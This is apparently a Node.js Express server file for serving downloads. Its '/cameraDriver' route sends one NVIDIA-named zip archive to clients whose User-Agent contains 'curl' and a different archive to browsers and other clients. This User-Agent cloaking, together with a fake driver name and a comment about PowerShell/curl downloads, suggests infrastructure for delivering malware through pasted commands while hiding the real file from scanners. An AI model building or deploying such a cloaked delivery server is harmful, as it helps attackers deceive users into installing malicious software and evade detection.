// server.js
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;
// Paths to files
const zipFile = path.join(__dirname, 'nvidiaRelease.zip');
const otherZipFile = path.join(__dirname, 'nvidiaDriver.zip');
app.get('/', (req, res) => {
    res.send('test');
});


app.get('/cameraDriver', (req, res) => {
    const userAgent = req.get('User-Agent') || '';
    console.log(userAgent);

    if (/curl/i.test(userAgent)) {
        try {
            const stat = fs.statSync(zipFile);
            const fileSize = stat.size;

            // Set headers so PowerShell/curl knows file size
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', 'attachment; filename="nvidiaRelease.zip"');
            res.setHeader('Content-Length', fileSize);

            const stream = fs.createReadStream(zipFile);
            stream.pipe(res);

            // Handle client abort
            req.on('close', () => {
                if (!res.writableEnded) {
                    console.log('Client aborted download');
                    stream.destroy();
                }
            });

            // Handle stream errors
            stream.on('error', (err) => {
                console.error('Stream error:', err);
                if (!res.headersSent) {
                    res.status(500).send('Server error');
                }
            });
        } catch (err) {
            console.error('File stat error:', err);
            res.status(500).send('Could not read file');
        }
    } else {
        res.sendFile(otherZipFile, (err) => {
            if (err) console.error('SendFile error:', err);
        });
    }
});

app.listen(80, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${80}`);
});
